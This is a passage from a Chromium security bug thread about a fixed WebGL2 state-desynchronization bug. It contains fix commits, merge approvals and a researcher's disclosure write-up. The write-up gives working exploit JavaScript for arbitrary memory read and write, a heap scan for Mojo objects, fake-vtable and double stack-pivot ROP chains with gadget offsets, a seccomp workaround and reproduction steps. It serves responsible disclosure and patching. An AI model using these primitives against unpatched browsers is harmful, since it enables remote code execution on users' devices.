        gl.bufferData(gl.PIXEL_PACK_BUFFER, bufferSize, gl.STREAM_READ);
        const attackAddr = 0x41414141;
            gl.readPixels(0, 0, 4, 4, gl.RGBA, gl.UNSIGNED_BYTE, attackAddr);
    });
    loseContextExt.loseContext();
</script>

```

### dx...@google.com (2026-03-04)

Project: chromium/src  

Branch:  main  

Author:  Kai Ninomiya [kainino@chromium.org](mailto:kainino@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7630664>

Increment WebGL context generation number on context restore

---


Expand for full commit details
```
     
    Objects created while the context is lost should not be valid to use 
    after the context is restored. 
    - Replace number_of_context_losses_ with a "context generation number" 
      which increments on both context loss and context restore. 
      - Technically, it would make sense to increment it only on context 
        restore, but just in case any logic is relying on the current 
        behavior, increment it in both places. 
      - It's uint64_t just in case someone figures out how to increment it 4 
        billion times. 
    - Remove unused WebGLRenderingContextBase::number_of_context_losses_, 
      left over from before it was moved into WebGLContextObjectSupport. 
     
    Bug: 485935305 
    Change-Id: I1007217c8e69cfb8de4f117e0b7845ca574579c4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7630664 
    Reviewed-by: Kenneth Russell <kbr@chromium.org> 
    Commit-Queue: Kai Ninomiya <kainino@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1593726}

```

---

Files:

- M `third_party/blink/renderer/modules/webgl/webgl_context_object_support.cc`
- M `third_party/blink/renderer/modules/webgl/webgl_context_object_support.h`
- M `third_party/blink/renderer/modules/webgl/webgl_object.cc`
- M `third_party/blink/renderer/modules/webgl/webgl_object.h`
- M `third_party/blink/renderer/modules/webgl/webgl_rendering_context_base.h`

---

Hash: [c1433740f3ea902fd6b15d63c4865ad60a3761f9](https://chromiumdash.appspot.com/commit/c1433740f3ea902fd6b15d63c4865ad60a3761f9)  

Date: Wed Mar 4 06:29:26 2026


---

### 24...@project.gserviceaccount.com (2026-03-04)

ClusterFuzz testcase 4879034999570432 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1593725:1593728

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### ch...@google.com (2026-03-04)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1593726) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1593726) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1593726) appears to be after beta branch point (1582197).
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ka...@chromium.org (2026-03-04)

> 1. Which CLs should be backmerged? (Please include Gerrit links.)

<https://crrev.com/c/7630664>

> 2. Has this fix been verified on Canary to not pose any stability regressions?

Not yet, not released <https://chromiumdash.appspot.com/commit/c1433740f3ea902fd6b15d63c4865ad60a3761f9>

> 3. Does this fix pose any potential non-verifiable stability risks?

Technically possible it could cause instability in unusual circumstances (WebGL context loss) on non-malicious websites but very unlikely.

> 4. Does this fix pose any known compatibility risks?

No

> 5. Does it require manual verification by the test team? If so, please describe required testing.

No, verified in local build and by clusterfuzz

### ch...@google.com (2026-03-05)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-05)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-05)

Merge review required: M144 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ka...@chromium.org (2026-03-05)

> 1. Why does your merge fit within the merge criteria for these milestones?

High severity security issue.

> 2. What changes specifically would you like to merge? Please link to Gerrit.

<https://crrev.com/c/7630664>

> 3. Have the changes been released and tested on canary?

Test cases confirmed in Canary. ClusterFuzz also automatically detected the issue was fixed.

Change is low risk. Not aware of any reported regressions in Canary with this fix, but it's only been a day.

> 4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No.

> 5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>

No.

> 6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

No, this is a fix for code that hasn't changed in a year so mergebacks should be safe without extra testing. Test cases are available above if needed.

### je...@gmail.com (2026-03-06)

To Chrome VRP team:

# Exploiting a WebGL2 PBO State Desynchronization for Renderer RCE on Android

## Target

The exploit targets Chromium's 32-bit ARM Android build (ChromePublic.apk compiled from `out/android-arm`), tested on a Pixel 4 (flame) with Qualcomm Snapdragon 855 running Android 13 (AOSP arm64-userdebug). The vulnerability resides in the WebGL2 Pixel Buffer Object implementation and requires no special GPU or hardware conditions; any device supporting WebGL2 is affected. The entire exploit is pure JavaScript served over HTTP, with no Chromium source modifications or patches required.

Tested on commit `89d6357f16ea4`.

## Summary

A state desynchronization between the Blink WebGL layer and the GPU command buffer client allows a WebGLBuffer created during WebGL context loss to pass Blink-level validation while being invisible to the GPU layer. When this "zombie" buffer is bound as a Pixel Buffer Object, the offset parameter of `readPixels` and `texImage2D` is reinterpreted as a raw memory pointer on the GPU client side, yielding arbitrary read and write primitives across the lower 2 GB of the renderer process address space. The exploit leverages these primitives to locate Mojo IPC objects in PartitionAlloc heap regions, overwrite a `RemoteRouterLink` vtable pointer with a fake vtable, and execute a double stack pivot ROP chain that calls `creat()` to create a file on the filesystem, demonstrating code execution within the renderer process.

## The Vulnerability

### Zombie Buffer Construction

The root of the vulnerability lies in the `WebGLBuffer` constructor. When a WebGL context is in the lost state, the constructor skips GL buffer generation entirely, leaving the internal object identifier at zero:

```
// third_party/blink/renderer/modules/webgl/webgl_buffer.cc
WebGLBuffer::WebGLBuffer(WebGLContextObjectSupport* ctx)
    : WebGLObject(ctx), initial_target_(0), size_(0) {
  if (!ctx->IsLost()) {
    GLuint buffer;
    ctx->ContextGL()->GenBuffers(1, &buffer);
    SetObject(buffer);
  }
}

```

The `createBuffer` WebGL API does not guard against calling the constructor while the context is lost. JavaScript code running inside a `webglcontextlost` event handler can therefore obtain a `WebGLBuffer` object whose internal GL name is zero.

After context restoration, this zombie buffer becomes a fully functional Blink-side object; it can be bound to any buffer target, and Blink records the binding in its internal state. However, when the binding propagates to the GPU command buffer client, the `ObjectOrZero` helper returns zero:

```
// third_party/blink/renderer/modules/webgl/webgl_object.h
template <typename T>
GLuint ObjectOrZero(const T* object) {
  return object ? object->Object() : 0;
}

```

The GPU client stores this zero in `bound_pixel_pack_buffer_` or `bound_pixel_unpack_buffer_`, effectively binding no buffer at the GPU layer while Blink believes a PBO is active.

### Size Inflation

The desynchronization extends to buffer size. When `bufferData` is called on the zombie buffer, the Blink-side `BufferDataImpl` sets the buffer's logical size before forwarding the call to the GPU:

```
// third_party/blink/renderer/modules/webgl/webgl_rendering_context_base.cc
void WebGLRenderingContextBase::BufferDataImpl(GLenum target,
                                               int64_t size,
                                               const void* data,
                                               GLenum usage) {
  WebGLBuffer* buffer = ValidateBufferDataTarget("bufferData", target);
  if (!buffer)
    return;
  // ...
  buffer->SetSize(size);
  ContextGL()->BufferData(target, static_cast<GLsizeiptr>(size), data, usage);
}

```

The GPU-side `BufferData` fails because no real buffer is bound, but the Blink-side `size_` has already been updated. Subsequent offset validation in `readPixels` and `texImage2D` uses this inflated size, allowing offsets up to 0x7FFFFFFF (the maximum value passing `ValidateValueFitNonNegInt32`).

### Arbitrary Write via readPixels

The PBO overload of `readPixels` checks that `bound_pixel_pack_buffer_` is non-null at the Blink level, then passes the offset directly to the GPU client:

```
// third_party/blink/renderer/modules/webgl/webgl2_rendering_context_base.cc
void WebGL2RenderingContextBase::readPixels(GLint x, GLint y,
                                            GLsizei width, GLsizei height,
                                            GLenum format, GLenum type,
                                            int64_t offset) {
  // ...
  WebGLBuffer* buffer = bound_pixel_pack_buffer_.Get();
  if (!buffer) {
    SynthesizeGLError(GL_INVALID_OPERATION, "readPixels",
                      "no PIXEL_PACK buffer bound");
    return;
  }
  // No check for buffer->HasObject()
  // ...
  ContextGL()->ReadPixels(x, y, width, height, format, type,
                          reinterpret_cast<void*>(offset));
}

```

On the GPU client side, `GLES2Implementation::ReadPixels` checks `bound_pixel_pack_buffer_`, which is zero for the zombie buffer. The code falls through to the non-PBO path, which treats the `pixels` parameter (the reinterpreted offset) as an actual memory address:

```
// gpu/command_buffer/client/gles2_implementation.cc
if (bound_pixel_pack_buffer_) {
  // PBO path - send offset to GPU service
  helper_->ReadPixels(..., offset.ValueOrDefault(0), ...);
  return;
}
// Non-PBO path: pixels is a real pointer
int8_t* dest = reinterpret_cast<int8_t*>(pixels);
dest += skip_size;
// ...
UNSAFE_TODO(memcpy(dest, src, copy_size));

```

The `memcpy` writes framebuffer pixel data (controlled by the attacker through prior draw calls) to the address specified by `offset`. The attacker controls the destination address, the data content, and the write length (through width and height parameters).

### Arbitrary Read via texImage2D

The complementary read primitive works through `texImage2D` with a PBO offset. Blink checks `bound_pixel_unpack_buffer_` (non-null for the zombie buffer at the Blink level) and passes the offset to the GPU client:

```
// third_party/blink/renderer/modules/webgl/webgl2_rendering_context_base.cc
if (!bound_pixel_unpack_buffer_) {
    SynthesizeGLError(GL_INVALID_OPERATION, "texImage2D",
                      "no bound PIXEL_UNPACK_BUFFER");
    return;
}
// No check for buffer->HasObject()
ContextGL()->TexImage2D(..., reinterpret_cast<const void*>(offset));

```

On the GPU client side, `bound_pixel_unpack_buffer_` is zero, so the code takes the non-PBO path and copies data from the address specified by `offset` into a texture. The attacker then reads the texture contents back through a normal (non-PBO) `readPixels` call to obtain the data, completing an arbitrary read.

## Exploit Strategy

The target is a 32-bit ARM Android renderer process. On Android, renderer processes are forked from the Zygote, which means all shared library mappings (libc, libchrome.so) have identical base addresses across renderer processes and across restarts. There is no per-process ASLR for these mappings. The exploit leverages this to use hardcoded gadget offsets.

The overall strategy is:

```
zombie buffer → arbitrary R/W primitive (0 to ~2 GB)
    → scan PartitionAlloc heap for Mojo IPC objects
    → overwrite RemoteRouterLink vtable pointer
    → double stack pivot ROP chain
    → creat("/data/local/tmp/pwned", 0666)

```
### Building the Read/Write Primitives

Creating the zombie buffer requires a controlled context loss and restoration cycle. The exploit uses the `WEBGL_lose_context` extension to trigger context loss, creates a buffer inside the `webglcontextlost` event handler, then restores the context:

```
const ext = gl.getExtension('WEBGL_lose_context');
const zombie = await new Promise(resolve => {
    let z = null;
    canvas.addEventListener('webglcontextlost', e => {
        e.preventDefault();
        z = gl.createBuffer();
        setTimeout(() => ext.restoreContext(), 100);
    });
    canvas.addEventListener('webglcontextrestored', () => resolve(z));
    ext.loseContext();
});

```

After restoration, the zombie buffer is bound to `PIXEL_PACK_BUFFER` (for writes) or `PIXEL_UNPACK_BUFFER` (for reads), and `bufferData` is called with a size of 0x7FE00000 to inflate the logical size for offset validation.

The arbitrary write primitive renders attacker-controlled pixel data to a framebuffer using a textured fullscreen quad, then calls `readPixels` with the zombie buffer bound to `PIXEL_PACK_BUFFER` and the target address as the offset. Because the GPU client interprets this offset as a raw pointer, the framebuffer contents are written directly to the target address:

```
function arbWrite(addr, data) {
    // Render attacker data to framebuffer via textured quad
    const tex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, tex);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, w, h, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
    gl.finish();
    gl.deleteTexture(tex);
    // Bind zombie to PIXEL_PACK_BUFFER and "read" into the target address
    gl.bindBuffer(gl.PIXEL_PACK_BUFFER, zombie);
    gl.bufferData(gl.PIXEL_PACK_BUFFER, BUF_SIZE, gl.STREAM_READ);
    gl.readPixels(0, 0, w, h, gl.RGBA, gl.UNSIGNED_BYTE, addr);  // addr interpreted as pointer
    gl.bindBuffer(gl.PIXEL_PACK_BUFFER, null);
}

```

The arbitrary read primitive works in reverse: `texImage2D` with the zombie buffer bound to `PIXEL_UNPACK_BUFFER` causes the GPU client to read from the target address into a texture. The texture is then attached to a framebuffer and read back through a normal (non-PBO) `readPixels` call:

```
function arbRead(addr, size) {
    // Bind zombie to PIXEL_UNPACK_BUFFER and "upload" from the target address
    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, zombie);
    gl.bufferData(gl.PIXEL_UNPACK_BUFFER, BUF_SIZE, gl.STREAM_READ);
    gl.bindTexture(gl.TEXTURE_2D, readTex);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, w, h, 0, gl.RGBA, gl.UNSIGNED_BYTE, addr);
    gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, null);
    // Read the texture back through a normal readPixels (no PBO)
    gl.bindFramebuffer(gl.FRAMEBUFFER, readFBO);
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, readTex, 0);
    const result = new Uint8Array(w * h * 4);
    gl.readPixels(0, 0, w, h, gl.RGBA, gl.UNSIGNED_BYTE, result);
    return result.slice(0, size);
}

```

Both primitives are limited to the range [0, 0x7FFFFFFF) by `ValidateValueFitNonNegInt32`.

### Information Gathering

The exploit requires knowledge of the renderer process memory layout. A helper script (`pa_discover.sh`) reads `/proc/<pid>/maps` from the device via `adb` to extract two pieces of information: the base address of `libchrome.so` and the addresses and sizes of PartitionAlloc data regions. These are written to a `pa_config.json` file served over HTTP. The exploit JavaScript polls for this file at startup.

The PartitionAlloc regions that fall below 0x7FE00000 (the upper bound of the read/write primitive) are scanned page by page. Each 4096-byte page is read via the arbitrary read primitive, and every 4-byte-aligned value is compared against the known vtable address of `mojo::core::ports::RemoteRouterLink`, computed as the libchrome base plus a fixed offset of 0x0665b958:

```
const TARGET_VT = (libchromeBase + 0x0665b958) >>> 0;
const targets = [];
for (const [start, end] of PA_REGIONS) {
    for (let off = start; off < end; off += 4096) {
        const page = arbRead(off, 4096);
        if (!page) continue;
        const dv = new DataView(page.buffer, page.byteOffset, page.byteLength);
        for (let i = 0; i < page.length - 4; i += 4) {
            if (dv.getUint32(i, true) === TARGET_VT)
                targets.push(off + i);
        }
    }
}

```

Every match represents a live `RemoteRouterLink` object in the heap.

### Preparing the SCRATCH Area

The exploit uses a 64 KB region starting at address 0x20000000 (the "SCRATCH area") to stage all exploit data structures. This address is chosen because it falls within the writable range and is typically unmapped, making writes to it safe from corrupting existing data. The following structures are written:

The fake vtable occupies 256 bytes at SCRATCH+0x100 and consists of 64 identical function pointer slots, each pointing to the stack pivot gadget. This ensures that regardless of which virtual function index is called during vtable dispatch, the stack pivot executes:

```
const FAKE_VT   = SCRATCH + 0x100;
const fakeVt = new Uint8Array(256);
const fvDv = new DataView(fakeVt.buffer);
for (let i = 0; i < 64; i++) fvDv.setUint32(i * 4, STACK_PIVOT, true);
arbWrite(FAKE_VT, fakeVt);

```

The file path string `/data/local/tmp/pwned\0` is written at SCRATCH+0x5000. A 32 KB zeroed region from SCRATCH+0x8000 to SCRATCH+0x10000 serves as the safe stack, providing enough stack space for `creat()` and its internal `open()` call to execute without stack overflow.

The second ROP chain (ROP2) occupies 64 bytes at SCRATCH+0x10000 (the top of the safe stack), laid out to match the register restore sequence of the stack pivot gadget:

```
const SAFE_STACK = SCRATCH + 0x10000;
const rop2 = new Uint8Array(64);
const rop2Dv = new DataView(rop2.buffer);
rop2Dv.setUint32(0,  0x00000000,   true);  // skipped by add sp, #4
rop2Dv.setUint32(4,  0x51515151,   true);  // r4  (junk)
// ... r5-r10, fp, ip filled with junk ...
rop2Dv.setUint32(40, POP_R0_R1_PC, true);  // lr  → pop {r0, r1, pc}
rop2Dv.setUint32(44, 0x5A5A5A5A,   true);  // skipped by add sp, #8
rop2Dv.setUint32(48, 0x5B5B5B5B,   true);  // skipped by add sp, #8
rop2Dv.setUint32(52, PATH_ADDR,    true);  // r0  = "/data/local/tmp/pwned"
rop2Dv.setUint32(56, 0x000001B6,   true);  // r1  = mode 0666
rop2Dv.setUint32(60, CREAT_ADDR,   true);  // pc  = creat()
arbWrite(SAFE_STACK, rop2);

```
### The Double Stack Pivot

The stack pivot gadget, found at offset 0x011f2270 in libchrome.so, executes in ARM mode:

```
mov sp, r0
add sp, #4
pop {r4, r5, r6, r7, r8, r9, r10, fp, ip, lr}
add sp, #8
bx lr

```

This gadget sets the stack pointer to the value in `r0`, skips 4 bytes, pops 10 registers (including `lr`), skips another 8 bytes, then branches to `lr`. When a virtual function is dispatched on a corrupted `RemoteRouterLink`, the `this` pointer (in `r0`) points to the corrupted object on the heap. The first pivot therefore sets the stack to the heap object itself, and the subsequent `pop` instructions load registers from the object's data.

The first ROP payload (ROP1) is a 60-byte overwrite of each discovered `RemoteRouterLink` object:

```
Offset  Value               Purpose
+0      FAKE_VT             vtable pointer → fake vtable → stack pivot
+4      SAFE_STACK - 1      → r4 (compensated for refcount increment)
+8..36  junk                → r5 through ip (unused registers)
+40     MOV_R0_R4 (Thumb)   → lr (called by bx lr after first pivot)
+44..48 junk                → skipped by add sp, #8
+52     junk                → r4 (consumed by mov r0,r4; pop{r4,pc})
+56     STACK_PIVOT (ARM)   → pc (second pivot, called by pop{r4,pc})

```

A subtle detail: the `RemoteRouterLink` object has a reference count at offset+4 that is incremented by one (as a 32-bit integer) before the vtable dispatch occurs. The exploit compensates by storing SAFE\_STACK minus one at offset+4, so that after the increment the value becomes exactly SAFE\_STACK:

```
const rop1 = new Uint8Array(60);
const rop1Dv = new DataView(rop1.buffer);
rop1Dv.setUint32(0,  FAKE_VT,              true);  // vtable → fake vtable → pivot
rop1Dv.setUint32(4,  (SAFE_STACK - 1)>>>0, true);  // r4 = SAFE_STACK-1 (refcount compensation)
// ... r5-r10, fp, ip filled with junk ...
rop1Dv.setUint32(40, MOV_R0_R4,            true);  // lr → mov r0, r4; pop {r4, pc}
rop1Dv.setUint32(44, 0x4A4A4A4A,           true);  // skipped by add sp, #8
rop1Dv.setUint32(48, 0x4B4B4B4B,           true);  // skipped by add sp, #8
rop1Dv.setUint32(52, 0x4C4C4C4C,           true);  // r4 (junk, consumed by pop {r4, pc})
rop1Dv.setUint32(56, STACK_PIVOT,           true);  // pc → stack pivot #2 (ARM)

for (const addr of targets)
    arbWrite(addr, rop1);

```

The first pivot loads SAFE\_STACK into `r4` and MOV\_R0\_R4 into `lr`. After `bx lr`, the `mov r0, r4; pop {r4, pc}` gadget (at offset 0x011d54d4+1, Thumb mode) transfers SAFE\_STACK from `r4` to `r0`, then pops a junk value into `r4` and the second `STACK_PIVOT` address into `pc`.

The second pivot executes the same `mov sp, r0` instruction, but this time `r0` contains SAFE\_STACK (0x20010000), which points to the pre-written ROP2 chain in the SCRATCH area. The `pop` sequence now loads registers from ROP2, placing the address of a `pop {r0, r1, pc}` gadget into `lr`. After `bx lr`, this gadget pops PATH\_ADDR into `r0`, the file mode 0x1B6 (octal 0666) into `r1`, and the address of `creat()` into `pc`.

### Gadgets

Three gadgets from libchrome.so and one libc function are used:

The stack pivot at offset 0x011f2270 executes in ARM mode: `mov sp, r0; add sp, #4; pop {r4-r10, fp, ip, lr}; add sp, #8; bx lr`.

The register transfer at offset 0x011d54d5 executes in Thumb mode: `mov r0, r4; pop {r4, pc}`.

The argument setup gadget at offset 0x014c4769 is an unintended gadget, the second halfword of a 32-bit Thumb `b.w` instruction that, when decoded independently as a 16-bit instruction, produces `pop {r0, r1, pc}`. This is a well-known technique for finding gadgets in Thumb-2 code.

The `creat` function in libc at offset 0x417ef (Thumb) is a thin wrapper that moves the mode argument, sets flags to `O_CREAT|O_WRONLY|O_TRUNC` (0x241), and tail-calls `open`, which ultimately invokes the `openat` system call.

### Bypassing Seccomp

The renderer process runs under a seccomp-bpf filter that blocks `fork`, `clone`, and `execve`. An earlier iteration of the exploit successfully called `system()` through the ROP chain, but `system()` internally uses `posix_spawn`, which requires `clone`, so the command was never executed.

The `creat()` function avoids this restriction entirely. It uses the `openat` system call, which is permitted by the renderer's seccomp policy (renderers need filesystem access for various operations). This makes `creat()` a reliable code execution primitive that creates a file with attacker-specified path and permissions, demonstrating that the ROP chain has achieved arbitrary function calls with controlled arguments.

### Triggering the Vtable Dispatch

After corrupting all discovered `RemoteRouterLink` objects, the exploit issues various IPC-triggering operations to cause Mojo to dispatch a virtual function call on one of the corrupted objects:

```
for (let i = 0; i < 5; i++) fetch('/pa_config.json?t=' + i).catch(() => {});
await sleep(300);
for (let i = 0; i < 10; i++) window.postMessage({i}, '*');
await sleep(200);
const iframe = document.createElement('iframe');
iframe.src = 'about:blank';
document.body.appendChild(iframe);
await sleep(500);
const mc = new MessageChannel();
mc.port1.postMessage('x');
await sleep(300);
const bc = new BroadcastChannel('exploit');
bc.postMessage('trigger');
bc.close();
await sleep(300);
navigator.sendBeacon('/beacon', 'trigger');

```

Network fetches, `postMessage`, iframe creation, `MessageChannel`, `BroadcastChannel`, and `sendBeacon` all exercise different Mojo IPC paths. When any of these triggers a virtual function call on a corrupted `RemoteRouterLink`, the fake vtable redirects execution into the ROP chain.

## Reproduce

The exploit targets the 32-bit ARM Android build of Chromium. It was tested on a Pixel 4 (flame, Qualcomm Snapdragon 855) running Android 13 (AOSP arm64-userdebug) with SELinux set to permissive mode, at commit `89d6357f16ea4`. No source code modifications are required.

The Chromium build should be configured for 32-bit ARM Android using the `out/android-arm` output directory. The standard `args.gn` for an Android ARM release build is sufficient; no special flags are needed beyond `target_cpu = "arm"` and `target_os = "android"`. After building with `autoninja -C out/android-arm chrome_public_apk`, install the APK on the device via `adb install -r out/android-arm/apks/ChromePublic.apk`.

The exploit consists of three files: `exp.html` (the main exploit), `pa_discover.sh` (a helper script that extracts memory layout information from the renderer process), and `pa_config.json` (generated by the helper script and consumed by the exploit). Place `exp.html` and `pa_discover.sh` in a directory and start an HTTP server on port 8888 from that directory using `python3 -m http.server 8888`.

Set up the device by running `adb shell setenforce 0` to set SELinux to permissive, then `adb shell chmod 777 /data/local/tmp` to ensure the renderer can create files in the target directory. Clear any previous state with `adb shell rm -f /data/local/tmp/pwned`.

Write `--remote-allow-origins=*` to `/data/local/tmp/chrome-command-line` on the device, as Chrome DevTools Protocol access is needed for the helper script. Set up port forwarding with `adb reverse tcp:8888 tcp:8888` and `adb forward tcp:9222 localabstract:chrome_devtools_remote`.

Launch Chrome on the device with `adb shell am start -n org.chromium.chrome/com.google.android.apps.chrome.Main -d 'http://localhost:8888/exp.html'`. Wait approximately 8 seconds for the renderer process to stabilize, then run `bash pa_discover.sh` from the host. This script reads the renderer's memory map, extracts PartitionAlloc region addresses and the libchrome.so base address, and writes them to `pa_config.json`. The exploit JavaScript polls for this file and begins execution once it is available.

The exploit scans accessible PartitionAlloc regions for `RemoteRouterLink` objects, overwrites their vtable pointers and surrounding data with the ROP chain, then triggers IPC operations to cause a vtable dispatch. If the PartitionAlloc layout is favorable (sufficient regions mapped below 2 GB), the exploit creates the file `/data/local/tmp/pwned` on the device. Verify the result with `adb shell ls -la /data/local/tmp/pwned`.

If no `RemoteRouterLink` objects are found in the accessible address range (the exploit will display "No targets!" and set the page title to "FAIL"), restart Chrome and repeat the process. The PartitionAlloc region layout varies between Chrome launches; typically one or two attempts are sufficient.

The following crash log is observed in `adb logcat` upon successful exploitation, showing the ROP chain executed through `creat()` and crashed cleanly after the function returned:

```
02-20 12:41:24.034 22945 22945 I CrRendererMain: type=1400 audit(0.0:8567): avc: denied { create } for name="pwned" scontext=u:r:isolated_app:s0:c512,c768 tcontext=u:object_r:shell_data_file:s0:c512,c768 tclass=file permissive=1
02-20 12:41:24.034 22945 22945 I CrRendererMain: type=1400 audit(0.0:8568): avc: denied { open } for path="/data/local/tmp/pwned" dev="dm-36" ino=3329 scontext=u:r:isolated_app:s0:c512,c768 tcontext=u:object_r:shell_data_file:s0:c512,c768 tclass=file permissive=1
02-20 12:41:26.325 22945 22983 F DEBUG   : signal 0 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr --------
02-20 12:41:26.325 22945 22983 F DEBUG   :     r0  00000000  r1  00000000  r2  00020241  r3  000001b6
02-20 12:41:26.325 22945 22983 F DEBUG   :     r4  51515151  r5  52525252  r6  53535353  r7  54545454
02-20 12:41:26.325 22945 22983 F DEBUG   :     ip  54545454  sp  2001004c  lr  c8710769  pc  00000000
02-20 12:41:26.325 22945 22983 F DEBUG   :       #00 pc 00000000  <unknown>
02-20 12:41:26.325 22945 22983 F DEBUG   :       #01 pc 014c4767  /data/app/~~ir_d16hZMYDzhjAX1-fMpA==/org.chromium.chrome-J3_Zj4XJJiDgWpiQzBv0kg==/lib/arm/libchrome.so
02-20 12:41:26.403 22910 22910 I Zygote  : Process 22945 exited due to signal 11 (Segmentation fault)

```

The register state confirms the ROP chain executed correctly: `r2` contains 0x20241 (the `O_CREAT|O_WRONLY|O_TRUNC` flags set by `creat()` internally), `r3` contains 0x1B6 (the mode argument, octal 0666), `r4` through `r7` contain the ROP2 junk fill values (0x51515151 through 0x54545454, restored by `creat()`'s epilogue), and `sp` is 0x2001004c (within the safe stack area). The crash at `pc=0x00000000` occurs after `creat()` returns, because the ROP chain does not set up a continuation address.

The SELinux audit lines confirm the `create` and `open` operations on the file were executed by the renderer process and allowed under permissive mode.

### ka...@chromium.org (2026-03-06)

That sounds like an unrelated issue. It needs to be filed in a separate bug. I can't tell whether it's legit.

### je...@gmail.com (2026-03-06)

re #c18: This is entirely an exploit of this vulnerability, I don't quite understand what you mean.

I also hope I've found a new one. :)

### ka...@chromium.org (2026-03-06)

Ah sorry. I thought the "Size Inflation" section was describing a separate vulnerability but if it's just part of this one, then this is the right place for it.

### dr...@chromium.org (2026-03-07)

No crashes in Canary. Approved to merge to M!46. We don't plan any more M144 or M145 releases, so removing those labels.

### ka...@chromium.org (2026-03-11)

Oops, missed the last email somehow. Merge opened in <https://crrev.com/c/7658823>

### dx...@google.com (2026-03-11)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Kai Ninomiya [kainino@chromium.org](mailto:kainino@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7658823>

[M146] Increment WebGL context generation number on context restore

---


Expand for full commit details
```
     
    Objects created while the context is lost should not be valid to use 
    after the context is restored. 
    - Replace number_of_context_losses_ with a "context generation number" 
      which increments on both context loss and context restore. 
      - Technically, it would make sense to increment it only on context 
        restore, but just in case any logic is relying on the current 
        behavior, increment it in both places. 
      - It's uint64_t just in case someone figures out how to increment it 4 
        billion times. 
    - Remove unused WebGLRenderingContextBase::number_of_context_losses_, 
      left over from before it was moved into WebGLContextObjectSupport. 
     
    (cherry picked from commit c1433740f3ea902fd6b15d63c4865ad60a3761f9) 
     
    Bug: 485935305 
    Change-Id: I1007217c8e69cfb8de4f117e0b7845ca574579c4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7630664 
    Reviewed-by: Kenneth Russell <kbr@chromium.org> 
    Commit-Queue: Kai Ninomiya <kainino@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1593726} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7658823 
    Auto-Submit: Kai Ninomiya <kainino@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
